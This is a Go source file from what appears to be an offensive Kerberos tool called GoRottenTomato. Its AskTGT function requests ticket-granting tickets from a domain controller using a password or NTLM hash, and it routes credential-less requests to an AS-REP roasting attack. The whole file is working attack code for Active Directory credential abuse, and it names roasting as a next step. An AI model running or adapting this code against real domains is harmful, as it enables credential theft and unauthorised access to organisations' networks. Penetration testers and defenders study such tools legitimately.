package AskTGT

import (
	"GoRottenTomato/krb5/KRBError"
	"GoRottenTomato/krb5/flags"
	"GoRottenTomato/krb5/netWork"
	"GoRottenTomato/krb5/procedure"
	"GoRottenTomato/krb5/types"
	"fmt"
	"strings"
)

func AskTGT(domain, username, password, dcIP, hash string, noPac bool, eType int32) (*procedure.AS_REP, error) {
	clientName := types.PrincipalName{
		Name_Type: flags.NT_PRINCIPAL,
		Name_String: []string{username},
	}

	serverName := types.PrincipalName{
		Name_Type: flags.NT_SRV_INST,
		Name_String: []string{"krbtgt", domain},
	}

	flag := types.GetKerberosFlags(flags.Renewable, flags.Forwardable, flags.Renewable_OK)
	realm := strings.ToUpper(domain)
	asreq := procedure.NewASREQ(realm, clientName, serverName, flag, eType)

	data, err := asreq.Marshal()
	if err != nil {
		return nil, fmt.Errorf("asreq marshaling failed %v", err)
	}

	if password == "" && hash == "" {
		//AS_REP Roasting Attack
		return roasting(dcIP, data)
	}

	resp, err := netWork.SendToKDC(dcIP, data)
	fmt.Printf("[*]Building AS_REQ for \"%s/%s\"\n", username, domain)
	var  key types.EncryptionKey
	if err != nil {
		if e, ok := err.(KRBError.KRB_Error); ok {
			switch e.Error_Code {
			case KRBError.KDC_ERR_PREAUTH_REQUIRED, KRBError.KDC_ERR_PREAUTH_FAILED:
				key, err = setPAData(&e, asreq, clientName, password, hash, realm, noPac, eType)
				if err != nil {
					return nil, err
				}
				data, err = asreq.Marshal()
				if err != nil {
					return nil, err
				}
				resp, err = netWork.SendToKDC(dcIP, data)
				if err != nil {
					return nil, err
				}
			default:
				return nil, fmt.Errorf("%v", err)
			}
		}else {
			return nil, fmt.Errorf("failed sending AS_REQ because %v", err)
		}
	}else {
		return nil, fmt.Errorf("There is no pre-authent, maybe you can use asreproast for %s@%s\n", username, domain)
	}

	return getTGT(resp, key)
}
